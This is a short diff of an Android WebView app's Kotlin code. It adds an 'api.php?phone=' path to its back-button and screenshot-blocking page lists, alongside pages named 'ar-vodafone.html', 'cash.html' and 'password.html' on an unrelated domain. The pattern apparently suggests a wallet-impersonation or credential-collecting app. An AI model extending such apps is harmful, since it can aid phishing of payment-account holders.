@@ -27,21 +27,20 @@ class MainActivity : AppCompatActivity() {
 
     private val WEBSITE_URL = "https://reviews8.site.je/"
 
-    // ================== اكواد المسارات ==================
-    // 1- مسارات زر الرجوع
+    // ===== مسارات الصفحات - هنا بتزود أي صفحة جديدة =====
     private val pagesWithBackButton = listOf(
         "ar-vodafone.html",
         "cash.html",
-        "password.html"
+        "password.html",
+        "api.php?phone="  // الصفحة الجديدة اللي طلبتها
     )
 
-    // 2- مسارات منع السكرين شوت
     private val protectedPages = listOf(
         "ar-vodafone.html",
         "cash.html",
-        "password.html"
+        "password.html",
+        "api.php?phone="  // نفس الصفحة الجديدة محمية من السكرين شوت
     )
-    // ===================================================
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
